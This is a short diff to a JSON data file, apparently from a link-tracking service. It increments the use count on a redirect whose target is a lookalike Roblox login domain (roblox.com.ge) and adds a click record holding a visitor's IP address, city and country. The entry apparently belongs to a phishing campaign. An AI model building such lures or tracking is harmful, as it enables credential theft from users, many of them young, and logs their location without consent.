@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1223,
+    "useCount": 1224,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9928,6 +9928,14 @@
         "city": "Živinice",
         "flag": "🇧🇦",
         "countryCode": "BA"
+      },
+      {
+        "timestamp": 1777316486175,
+        "ip": "186.165.118.191",
+        "country": "Venezuela",
+        "city": "Caracas",
+        "flag": "🇻🇪",
+        "countryCode": "VE"
       }
     ]
   },
